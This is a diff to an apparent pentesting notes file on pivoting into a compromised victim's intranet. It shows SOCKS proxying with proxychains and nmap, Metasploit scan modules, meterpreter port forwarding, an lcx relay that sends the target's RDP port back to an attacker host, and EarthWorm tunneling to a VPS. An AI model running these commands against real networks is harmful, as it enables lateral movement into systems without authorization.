@@ -99,8 +99,10 @@ socks5 127.0.0.1 1080
 ```
 Then you can use socks proxy to scan the victim's intranet:
 ```shell
-proxychains4 nmap -sT -Pn -open 192.168.100.1/22(TODO)
+proxychains4 nmap -sT -Pn -open 192.168.100.1/22
 ```
+The command above is from the Internet and I'm so confused about it. I have tried so many times to find out all the machines in the victim's intranet but I was always failed. I'm figuring out the proposal for this problem.
+
 You can also use the msf built-in module to scan:
 ```shell
 auxiliary/scanner/portscan
@@ -109,7 +111,7 @@ scanner/portscan/tcp
 ```
 If you need ports forwarding, it's also available in meterpreter:
 ```shell
-meterpreter> portfwd add -l 55555 -r 192.168.16.1 -p 3306(TODO)
+meterpreter> portfwd add -l 55555 -r 192.168.1.1 -p 3306
 ```
 Another popular tool is lcx.exe:
 For attacker:
@@ -118,7 +120,7 @@ lcx -listen 2222 3333
 ```
 For target:
 ```shell
-lcx -slave 110.1.1.1 2222 127.0.0.1 3389
+lcx -slave x.x.x.x 2222 127.0.0.1 3389
 ```
 
 Or you can use EarthWorm(http://rootkiter.com/EarthWorm/) to forward the victim machine's port to your VPS and use proxychains or proxifier in your local machine:
